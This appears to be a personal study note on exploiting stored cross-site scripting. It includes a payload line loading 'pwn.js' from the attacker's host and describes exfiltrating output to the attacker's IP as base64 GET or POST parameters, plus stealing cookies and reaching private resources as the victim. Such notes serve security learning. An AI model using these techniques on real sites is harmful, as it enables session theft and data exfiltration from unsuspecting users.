**MOSTLY UNIMPORTANT, EXCEPT STORED [[XSS (Cross-site scripting)#^adea97]]
- Almost every time, the idea is to get access to private resources that aren't available for the attacker. (If no one it's accessing the compromised resource, it has no utility in most of the cases.)

**Stored XSS**
It's a xss vuln that is in some way stored and triggered from another client.  ^adea97
- (Ex: A comment form that shows the comment in some page)

An useful way to exploit it is by using `<script src=<tunip>/pwn.js`
- Then, in `pwn.js` i can control the script runned by the server
- Also save the triggering request as a `curl` command so i can exploit it easier
- Finally, for the output i can perform an http-request inside `pwn.js` agains mi own ip, in order to get output.
	- I can send the data as a base64-encoded `GET` parameter and maybe do some automation for rendering (in case of using the `xss` as a proxy or bypass)
		- Sometimes `GET` it's blocked by CORS policy (??), so i can try `POST`


**Things that i can do if i found one**
- Get cookies `(document.cookies)`
- Perform request against private resources (since im doing it from another client)
